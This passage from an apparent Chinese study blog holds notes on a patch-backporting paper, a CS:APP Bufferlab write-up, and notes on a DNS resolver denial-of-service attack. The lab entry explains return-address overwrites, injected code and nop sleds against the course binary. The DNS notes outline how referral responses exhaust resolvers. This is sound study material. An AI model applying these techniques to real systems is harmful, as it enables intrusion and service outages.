alt="image-20231108140242515"></p><ul><li>Reach Condition（到达条件）：是涉及到flow k的所有控制流条件的集合</li><li>DE：涉及到flow k的参数的符号表达式</li></ul><p>将不同汇聚点流的所有 RC 和 DE 放在一起，并将它们定义为联合集（{&lt;RC flow1, DE flow1&gt;, &lt;RC flow2, DE flow2&gt;, …}），作为汇聚点能力（sink capability），表示注入漏洞的脆弱逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ($condition)<br>  $value = $input1<br><span class="hljs-keyword">else</span><br>  $value = $input2<br><br>sink_func($value + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>有两个sink flows，一个来自if分支，记作flow1，一个来自else分支，记作flow2</p><p>flow1的RC ：{$condition} , DE:{$input1+1}</p><p>flow2的RC : {$condition}, DE:{$input2+1}</p><p><img src="/2023/10/31/ReadPaper3/image-20231108153958177.png" alt="image-20231108153958177"></p><h4 id="补丁影响分析"><a href="#补丁影响分析" class="headerlink" title="补丁影响分析"></a>补丁影响分析</h4><p><strong>首先利用前向分析定位受影响的行</strong></p><p>SKYPORT从补丁的更改开始执行前向污点分析，并使用受影响的行中的受影响的变量查询程序依赖图（用于描述程序中各个元素之间的依赖关系和控制流关系）</p><p>该分析包括可能影响汇聚点函数的达到条件或数据流表达式的三种类型的语句，并排除其他无关的语句。具体来说，这三种类型的语句包括赋值语句（影响数据流表达式）、条件语句（影响达到条件）和退出语句（影响达到条件）</p><p><strong>从受影响的行中识别汇聚点函数</strong>sink</p><p>基于开发者创建的sink函数和漏洞类型之间的映射</p><p>若有些sink函数是开发人员自定义的，那么就执行代码可达性分析来找到最终的sink函数</p><p>代码可达性分析：用于确定程序中的哪些代码部分可以在不同的执行路径上被访问或执行</p><p><img src="/2023/10/31/ReadPaper3/image-20231108150345617.png" alt="image-20231108150345617"></p><h4 id="汇聚点能力提取"><a href="#汇聚点能力提取" class="headerlink" title="汇聚点能力提取"></a>汇聚点能力提取</h4><p>接收汇聚点函数的列表和给定版本的Web应用程序，然后计算所有汇聚点函数的汇聚点能力（Sink capability，简称SC）</p><p>详细来说：</p><p>首先，SKYPORT 执行前向路径探索，从入口点或调用者函数开始，沿着控制流边缘追踪，直到达到提供的汇聚点函数。在探索过程中，SKYPORT 还会检查是否存在退出语句，例如die()，并停止探索。如果 SKYPORT 遇到一个循环，它会展开一次循环以避免路径爆炸。</p><p>其次，SKYPORT 通过符号跟踪根据树地址代码（TAC）公式计算RC和DE，然后联合成SC：&lt;RC, DE&gt;</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TAC 是 &quot;Tree Address Code&quot; 的缩写，是一种中间表示（Intermediate Representation）的形式，通常用于编程语言编译器和静态代码分析器中。<br><br>TAC 是一种树状结构，用于表示程序的控制流和数据流。它通常包括以下元素：<br><br><span class="hljs-bullet">1.</span> 操作符（Operators）：表示执行的操作，例如加法、减法、乘法、赋值等。<br><span class="hljs-bullet">2.</span> 操作数（Operands）：参与操作的变量、常数或表达式。<br><span class="hljs-bullet">3.</span> 表达式树（Expression Tree）：用于表示复杂的表达式，其中每个节点代表一个操作符，而子节点代表操作数或其他子表达式。<br><span class="hljs-bullet">4.</span> 条件语句（Conditional Statements）：用于表示分支和条件控制结构，如 if 语句、while 循环等。<br><span class="hljs-bullet">5.</span> 标签（Labels）：用于标识代码的不同部分，以便在跳转指令中引用。<br></code></pre></td></tr></table></figure><h4 id="SBP验证和生成"><a href="#SBP验证和生成" class="headerlink" title="SBP验证和生成"></a>SBP验证和生成</h4><p>在这一步，需要检查原始的官方补丁是否可以进行逆向移植，并将其转化成SBP，具体来说，需要检查以下三个属性：</p><p>PSBP-a：对于每个flow k，RC post flow k 都是RC pre flow k的子集（为了防止SBP引入未知的控制流到补丁后的版本）</p><p>PSBP-b：对于每个flow k，DE post flow k都是 DE pre flow k的子集（为了防止SBP补丁向补丁后版本引入未知的数据表达式，因为这有可能破坏目标版本的功能）</p><p>PSBP-c：对于每个flow k，RC post flow k和DE post flow k都是确定可计算的（排除了例如time（），rand（）等返回非确定性值的函数）</p><p>这三个属性确保SBP的部署不会影响目标应用程序的正常功能</p><p>若同时满足这三个条件，那就认为原始补丁是可以进行反向移植的</p><p>然后SKYPORT就会生成一个安全的sink函数，并替换掉原始的sink函数</p><p>因为在汇聚点能力提取的时候，对于循环，是只展开一次，然后计算的，所以需要在考虑SBP验证时对循环进行处理处理：</p><ul><li>补丁和汇聚点在循环体内：SKYPORT将循环块视作一个函数，并计算函数内的SC，然后进行SBP验证</li><li>补丁在外，汇聚点在内：SKYPORT将循环视作sink函数，计算SC</li><li>补丁在内或者外，汇聚点在外：SKYPORT将循环封装成一个函数用以计算SC（？）</li></ul><h4 id="SBV验证"><a href="#SBV验证" class="headerlink" title="SBV验证"></a>SBV验证</h4><p>同样的，基于汇聚点能力的子属性来进行验证</p><p>PSBV-a：对于每个 f lowk，RC pre flow k 与 RC target flow k相同。这个属性确保目标版本中没有额外的脆弱控制流。sink1和sink2 target：sink1</p><p>PSBV-b：对于每个 f lowk，DE pre flow k 与 DE target flow k 相同。这个属性确保目标版本中没有额外的脆弱数据表达式。</p><p>这两个子属性可以保证将SBP应用到SBV后能保证安全性，因为两个版本的脆弱逻辑完全相同</p><h4 id="部署补丁"><a href="#部署补丁" class="headerlink" title="部署补丁"></a>部署补丁</h4><p>对Web应用程序的源代码进行修改</p><p>包含两个步骤，替换和备份</p><p><strong>替换</strong></p><ol><li>函数替换：直接将sink函数替换成安全的函数</li><li>参数替换：若sink函数无法被直接替换，比如是php的关键字include之类的，SKYPORT就将include改成include safe_include()</li></ol><p>在这一步时，SKYPORT会检查名称冲突避免函数名称已经被使用了</p><p><strong>备份</strong></p><p>SKYPORT备份了与sink函数相关的变量，特别是全局变量、汇聚函数调用者的参数和外部变量，然后在安全的函数中使用</p><h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><p><img src="/2023/10/31/ReadPaper3/image-20231108165043937.png" alt="image-20231108165043937"></p><p>数据集包括了 155 个补丁（即 155 个预补丁版本和后补丁版本）以及 1,526 个有漏洞的目标旧版本</p><p>与当前最先进的技术进行比较：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108165248741.png" alt="image-20231108165248741"></p><ol><li>**直接应用补丁(Direct Patch Application)**：这种方法直接使用”patch”命令将官方补丁应用到目标版本上。</li><li>**严格自动升级(Strict Auto-upgrade)**：如果两个 Web 应用程序版本之间支持的 PHP 版本相同，利用 Web 应用程序框架提供的自动升级 API</li><li>**懒惰自动升级(Lazy Auto-upgrade)**：这种方法是对严格自动升级的一种宽松方法，它认为如果 PHP 版本冲突仅存在于测试文件中，自动升级就可以成功。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapplab-bufferlab</title>
    <link href="/2023/10/06/csapplab-bufferlab/"/>
    <url>/2023/10/06/csapplab-bufferlab/</url>
    
    <content type="html"><![CDATA[<h2 id="Bufferlab"><a href="#Bufferlab" class="headerlink" title="Bufferlab"></a>Bufferlab</h2><h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p><p>调用者的栈帧主要包括了参数区以及返回地址。</p><p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p><ul><li>bufbomb 你所要攻击的缓冲区炸弹程序</li><li>makecookie 根据你所输入的userid生成一个cookie</li><li>hex2raw 一个生成攻击字符串的工具</li></ul><p>首先生成一个cookie供后续使用：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012161536180.png" alt="image-20231012161536180"></p><p>然后使用Ghidra将bufbomb反汇编供后续分析</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0-Candle"><a href="#阶段0-Candle" class="headerlink" title="阶段0:Candle"></a>阶段0:Candle</h3><p>在bufbomb中，通过了test()函数调用getbuf()函数</p><p>test函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">int</span> iVar3;<br>  <br>  iVar1 = uniqueval();<span class="hljs-comment">//这个函数利用进程的id作为种子生成一个伪随机数</span><br>  iVar2 = getbuf();<br>  iVar3 = uniqueval();<br>  <span class="hljs-keyword">if</span> (iVar3 == iVar1) &#123;<span class="hljs-comment">//用于验证栈是否被损坏</span><br>    <span class="hljs-keyword">if</span> (iVar2 == cookie) &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>      validate(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>getbuf：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined4 <span class="hljs-title function_">getbuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  undefined local_2c [<span class="hljs-number">40</span>];  <br>  Gets(local_2c);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>目标：让代码执行smoke（）而不是让getbuf（）返回1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163333070.png" alt="image-20231012163333070"></p><p>通过Ghidra的反汇编结果可以看到smoke函数的起始地址为08048c18</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163807613.png" alt="image-20231012163807613"></p><p>再分析getbuf的汇编代码</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012170015339.png" alt="image-20231012170015339"></p><p>可以看到，开辟了一个0x38（56）字节的栈空间，将数组的首地址放在了ebp-0x28的位置，就是说缓冲区有40个字节。</p><p>再加上返回地址和保存的旧的ebp值，此处需要构造如下攻击字段：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192005282.png" alt="image-20231012192005282"></p><p>使用hex2raw生成攻击字符串并测试</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192126197.png" alt="image-20231012192126197"></p><h3 id="阶段1-Sparkler"><a href="#阶段1-Sparkler" class="headerlink" title="阶段1: Sparkler"></a>阶段1: Sparkler</h3><p>目标：getbuf返回时跳转到fizz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> param_1)</span><br><br>&#123;<br>  <span class="hljs-keyword">if</span> (param_1 == cookie) &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>,param_1);<br>    validate(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>,param_1);<br>  &#125;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，要成功调用fizz还需要将cookie作为参数传递，在IA32中，参数是通过调用者的栈进行传递的</p><p>观察fizz的反汇编代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012194646326.png" alt="image-20231012194646326"></p><p><code>mov    0x8(%ebp),%eax</code>和 <code>cmp    0x804d108,%eax</code>这两句，将ebp+8的位置的值赋值给eax，再将eax与0x804d108的值比较，可以猜测ebp+8位置存放的就是传递的参数，而0x804d108的值为cookie</p><p>通过gdb调试验证：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200351900.png" alt="image-20231012200351900"></p><p>可以得到0x804d108的值就是cookie，那么参数就在ebp+8的位置，猜测正确</p><p>构造如下攻击字段：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195924030.png" alt="image-20231012195924030"></p><p>进行生成和测试：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195855241.png" alt="image-20231012195855241"></p><p>疑问：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200444062.png" alt="image-20231012200444062"></p><p>为什么这里也是表示的是ebp+8的位置</p><h3 id="阶段2：Firecracker"><a href="#阶段2：Firecracker" class="headerlink" title="阶段2：Firecracker"></a>阶段2：Firecracker</h3><p>目标：含有一个 bang 函数，和一个全局变量 global_value，需要注入机器代码，修改 global_value 为 cookies 的值，再调用 bang 函数。</p><p>Ghidra获得的bang函数：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012202402226.png" alt="image-20231012202402226"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012204852875.png" alt="image-20231012204852875"></p><p>通过gdb查看0x804d100的值和0x804d108（上一问得出该地址为cookie）</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012205107345.png" alt="image-20231012205107345"></p><p>所以可以构造如下攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211941649.png" alt="image-20231012211941649"></p><p>第一句movl用于修改global_value的值，第二步用于将bang压栈</p><p>获取其机器代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212046878.png" alt="image-20231012212046878"></p><p>通过gdb设置断点</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212231854.png" alt="image-20231012212231854"></p><p>此时的ebp-0x28的位置就是缓冲区的首地址，</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212311757.png" alt="image-20231012212311757"></p><p>构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212345337.png" alt="image-20231012212345337"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211925176.png" alt="image-20231012211925176"></p><h3 id="阶段3-Dynamite"><a href="#阶段3-Dynamite" class="headerlink" title="阶段3 Dynamite"></a>阶段3 Dynamite</h3><p>让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p><p>最初是test调用getbuf，前几问通过缓冲区溢出的攻击，实现了到别的函数的跳转，但不会回来继续执行test函数剩下的内容。从test函数可以看出，当收到getbuf的返回值为1时，会输出Dud，当该值为cookie时，会输出Boom！</p><p>但看getbuf函数可以知道，在函数结束后，会将eax的值设置为1然后返回</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012214342894.png" alt="image-20231012214342894"></p><p>所以构造的代码第一步要修改eax的值为cookie</p><p>而在进行缓冲区覆盖的时候，旧的ebp值会被覆盖，所以需要恢复此时的ebp值</p><p>第三步是需要进行返回地址的修改，让函数能够继续执行test函数</p><p>所以可以构造如下攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215742153.png" alt="image-20231012215742153"></p><p>转换成机器代码的步骤跟上一问一样，最后构造的攻击字段为：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215823675.png" alt="image-20231012215823675"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215723486.png" alt="image-20231012215723486"></p><h3 id="阶段4-Nitroglycerin"><a href="#阶段4-Nitroglycerin" class="headerlink" title="阶段4 Nitroglycerin"></a>阶段4 <strong>Nitroglycerin</strong></h3><p>程序运行时启用了 -n 选项时，程序在读取输入时会启用 getbufn函数(而不是前面的getbuf)。getbufn函数有与getbuf相似的功能，但前者输入数组的长度为512字节。调用getbufn函数之前，程序会先在栈上分配一个随机长度的空间，从而使得getbufn函数的栈空间在不同调用情况下不再是固定的，实际上%ebp的差值达到±240。在应用 -n 选项的情况下，程序会要求提交输入字符串 5 次，5次输入会面对5个不同的栈空间，并要求每次都成功返回cookie值。level 4的任务与level 3一致，即要求getbufn函数返回调用函数testn时返回cookie值，而不是常规的1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221107722.png" alt="image-20231012221107722"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221140589.png" alt="image-20231012221140589"></p><p>对于栈随机化的破解可以使用空操作雪橇，nop sled是在构造的机器代码之前加入nop指令（no operation的缩写，机器码位 0x90），其作用为仅将PC增加而不执行任何操作。在这种情况下，只要覆盖的地址能够指向nop序列所处的任意一个地址，就可以顺序执行nop指令，直到遇到真正构造的机器代码，这样的情况下，对于用于覆盖的返回地址的要求就降低了。</p><p>可以看到，数组的分配长度为0x208（520）个字节</p><p>解题思路：</p><p>（1）修改getbufn的返回地址至testn使其能够继续执行</p><p>（2）修改eax的值为cookie</p><p>（3）还原ebp的值，这里不能使用level3的方法，因为每次程序运行时，栈空间的位置都不一样，所以不能通过3中的方法修改固定地址，但由于每次都是执行相同的代码，那么每次执行时栈中元素的相对位置是不变的。在level3中已经分析了，旧的ebp值已经被覆盖了，因此其值没有应用价值，可以考虑通过esp的值恢复ebp的值</p><p>通过阅读testn的汇编，在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于push ebx而减去了4，再手动减去了0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。</p><p>所以构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001613439.png" alt="image-20231013001613439"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001632974.png" alt="image-20231013001632974"></p><p>最终构造的攻击代码应该有520（缓冲区长度）+4（覆盖ebp）+4（覆盖返回地址）个字节</p><p>返回地址的选择可以任意跑一次代码，查看ebp位置并-0x208得到的值，进行五次，取最高的一个，这样可以保证每次执行都会通过雪橇一路滑到目标代码进行执行</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231023163626058.png" alt="image-20231023163626058"></p><p>因为此处对于单个用户输入的id来生成cookie，作为random的种子，但random是个伪随机函数，所以对于用户来说，开辟的五次空间都是固定的。</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013010919080.png" alt="image-20231013010919080"></p><p>所以构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005138599.png" alt="image-20231013005138599"></p><p>509个nop+15个操作码+4返回地址</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005117564.png" alt="image-20231013005117564"></p>]]></content>
    
    
    <categories>
      
      <category>csapplab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NRDelegationAttack</title>
    <link href="/2023/09/11/NRDelegationAttack/"/>
    <url>/2023/09/11/NRDelegationAttack/</url>
    
    <content type="html"><![CDATA[<h2 id="NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）"><a href="#NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）" class="headerlink" title="NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）"></a>NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）</h2><p>论文的主题为针对 DNS 递归解析器的 DDoS 攻击。该工作由来自 Tel-Aviv University （以色列特拉维夫大学） 的 DEEPNESS Lab 的研究人员完成。</p><p>利用系统在应对不利条件或异常情况时的性能瓶颈和漏洞，从而有意或恶意地导致系统资源的不合理使用或耗尽。</p><p>Referral response: 引荐响应，是指在计算机网络中，特别是在DNS（域名系统）中，一个服务器向另一个服务器提供关于如何解析特定查询的信息的响应。这种响应告诉请求服务器应该将查询转发到哪个其他服务器来获取所需的信息。</p><p>在DNS中，引荐响应通常是由权威DNS服务器提供的。当一个DNS服务器收到一个查询，但它不拥有与该查询相关的信息时，它可以向请求服务器返回一个引荐响应，指示请求服务器将查询发送到另一个DNS服务器，通常是更高级别的DNS服务器，以获取所需的信息。这个过程可以追溯到根DNS服务器，以便最终找到与查询相关的IP地址或其他资源记录。</p><h4 id="Glue-record"><a href="#Glue-record" class="headerlink" title="Glue record"></a>Glue record</h4><p>普通的DNS记录是保存在权威服务器上的，胶水记录是保存在注册局的DNS服务器上的</p><p>简述一个DNS查询流程：若要查询jd.com</p><ol><li>获取根服务器列表</li><li>向根服务器发送查询（“请问你有jd.com吗？” “没有，但你可以找.com问问，我正好有他们的ip地址，顺带给你吧”）</li><li>向.com权威服务器发送查询（“请问你有jd.com吗” “没有，但你可以找管理jd.com的服务器问问，我正好有他们的ip地址，给你吧”）</li><li>向jd.com域名权威服务器发送查询（“请问你有jd.com吗” “有的，给你吧”）</li></ol><p>在查询过程中，2，3步返回的结果中，顺带给的ip地址就是胶水记录，若没有，则需要<strong>额外的查询去获得ip地址</strong>（递归解析器开启主动解析进程，每个名称服务器启动一个独立的递归状态，查询权威服务器提供的全部名称服务器的ip地址，此过程将消耗大量的服务器资源）</p><p>同时，假设在自建服务器中，example.com使用ns1.example.com和ns2.example.com作为权威服务器</p><p>为了解析example.com，若没有胶水记录，则无法知道ns1.example和ns2.example.com的ip，那么为了解析ns1.example.com的地址，又需要解析example.com，从而陷入循环</p><h4 id="NXNSAttack攻击"><a href="#NXNSAttack攻击" class="headerlink" title="NXNSAttack攻击"></a>NXNSAttack攻击</h4><p>通过向某一递归解析器查询攻击者的权威服务器授权域名的子域名发起大量查询请求，致使攻击者的恶意查询流量在解析过程中被放大，最终导致递归解析器与受害者域名的权威域名服务器遭受拒绝服务攻击。</p><p>威胁模型：</p><p>NXNSAttack的攻击者拥有一个二级域名，如attack.com并维护其权威服务器，并且可以为该域配置大量不同的子域名</p><p>为这些子域名设置NS记录，将这些子域名的解析授权到受害者域名，如victim.com的多个不存在的子域名的权威服务器，这些子域名实际上不存在victim.com的DNS配置中</p><p>攻击流程：</p><p><img src="/2023/09/11/NRDelegationAttack/image-20230914150452417.png" alt="image-20230914150452417"></p><ol><li>攻击者向其维护的一个子域名ns1.attacker.com发起DNS查询请求，攻击者每次查询会使用不同的子域名，以此来绕过递归解析器的缓存机制</li><li>攻击者请求会到达attack.com的权威服务器，并返回提前设置好的DNS响应，其中包含大量的NS记录，这些记录指向受害者域下的不存在的子域名，而且不包含glue记录，即不会包含这些子域名的ip地址</li><li>当递归解析器收到大量包含NS记录的响应后，会尝试解析这些NS记录，以确定每个名称服务器的ip地址。为了完成这个任务，解析器就会向victim.com的权威服务器发送大量的NS解析请求</li><li>但由于这些子域名并不存在，受害者域的权威服务器就回返回NX响应（Name Error）</li><li>由于递归解析器不断地发起NS解析请求，而受害者域的权威服务器始终返回NX响应，就会占用服务器资源，最终导致递归解析器和受害者域名的权威服务器遭受拒绝服务攻击，无法响应正常的DNS请求。</li></ol><h4 id="缓解策略：MaxFetch-k"><a href="#缓解策略：MaxFetch-k" class="headerlink" title="缓解策略：MaxFetch(k)"></a>缓解策略：MaxFetch(k)</h4><p>具体步骤：</p><ol><li>对于每一个请求中的1个或k个名称服务器进行解析，而不是在NS记录响应到达递归解析器时，一次性查询该区的全部名称服务器ip</li><li>收到用户请求时，如果请求的是已经解析过的名称服务器时，解析器会解析另外k个名称服务器的ip地址</li><li>解析过程一直持续到权威返回的NS记录响应中提供的所有NS记录被解析</li></ol><p>例如，在BIND9的实现中，k为5，在收到包含许多NS名称的引用响应时，BIND9只解析5个，如果所有的解析都反回NXDOMAIN（域名不存在或无法解析），则解析终止并向客户端返回NY响应。</p><h4 id="攻击利用的四个DNS机制"><a href="#攻击利用的四个DNS机制" class="headerlink" title="攻击利用的四个DNS机制"></a>攻击利用的四个DNS机制</h4><h5 id="Slist"><a href="#Slist" class="headerlink" title="Slist"></a>Slist</h5><p>“SLIST” 机制在 RFC-1034 中提出。它在解析器实现中用作临时存储器，用于记录在处理客户端查询时执行的每个中间名称服务器解析的状态。在 BIND9 中其被实现为 address-DB (ADB) 。当递归解析器接收到响应中没有包含 NS 记录的 IP 地址的响应时，其将 NS 记录保存在 ADB 中，并启动新的 DNS 查询来收集这些 NS 服务器的 A 记录。</p><h5 id="Delegation-Response"><a href="#Delegation-Response" class="headerlink" title="Delegation Response"></a>Delegation Response</h5><p>要回答解析器的查询请求，权威服务器可以决定将解析工作委托给另一个名称服务器。例如图 2 中，example1.com 将 e1.example.com 的解析委托给 www1.example2.com ，或者当解析器获得引用响应（Referral Response, RR） 时，就会发生这种情况。</p><h5 id="Referral-Reponse-Limit"><a href="#Referral-Reponse-Limit" class="headerlink" title="Referral Reponse Limit"></a>Referral Reponse Limit</h5><p>即上文提到过的缓解措施，当查询达到限制时，将设置一个特殊标志，No_Fetch</p><h5 id="Restart-Event"><a href="#Restart-Event" class="headerlink" title="Restart Event"></a>Restart Event</h5><p>在许多情况下，解析器中的解析过程被委托给不同的名称服务器，在这种情况下，它将重新启动并在新的名称服务器上继续解析。被重定向到的“新权威”服务器将会被记录在 ADB 中。</p><p>在restart时，解析器会清除和重置一些标识位，其中包括为了缓解 NXNSAttack 引入的No_Fetch标识位，其用来限制解析器每次查询的NS数量，当No_Fetch为1时，将终止本次解析。</p><h4 id="NRDelegation-Attack威胁模型"><a href="#NRDelegation-Attack威胁模型" class="headerlink" title="NRDelegation Attack威胁模型"></a>NRDelegation Attack威胁模型</h4><h5 id="攻击条件："><a href="#攻击条件：" class="headerlink" title="攻击条件："></a>攻击条件：</h5><ol><li>一个或多个可以发起恶意查询的客户端</li><li>一个可以产生特定referral response的可控权威服务器</li><li>不响应DNS查询的服务器列表或ip地址</li></ol><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p><img src="/2023/09/11/NRDelegationAttack/image-20230914163958837.png" alt="image-20230914163958837"></p><p><strong>阶段1</strong></p><ol><li>攻击者发起恶意查询，xyz.referral.com</li><li>受害者解析器向攻击者控制的权威服务器查询referral.com</li><li>referral.com回复一个大型引用响应</li></ol><p><strong>阶段2</strong></p><ol start="4"><li>解析器首先遍历ADB和缓存，查看这些NS是否已经被查询过，因为存在A和AAAA两种记录（IPv4和IPv6），所以会查询2n次</li><li>解析器没有找到NS的有效信息，就回发起解析，由于Referral Response Limit的存在，每次只查询k个</li></ol><p>攻击者利用可控的权威名称服务器返回没有胶水记录的超长的referral response（大小设为 n ）。根据解析器软件的实现（文中主要针对 BIND9 的实现），解析器首先将遍历 ADB 和缓存，查看这些 NS 是否之前查询过，因为存在 A 和 AAAA 两种记录，所以会查询2n次，这是 NRDelegationAttack 的主要成因之一，<strong>每次的遍历耗费了服务器大量的计算资源</strong>。当解析器没有找到 NS 的有效信息，则会对这些 NS 发起解析，由于Referral Response Limit限制的存在，因此，解析器每次仅查询有限的 k 个 NS。</p><p><strong>阶段3</strong></p><p>当解析器查询referral response中的NS时，将被引导至权威服务器，并触发委托响应，这时候restart事件被激活，No_Fetch标识符被清除，重新开启第4步，<strong>重新检查ADB和缓存</strong>。由于攻击者设置的是不响应 DNS 查询的服务器，因此，这些无法获取到这些NS的有效信息，因此，无法在ADB 中更新这些 NS 的信息。所以步骤 10 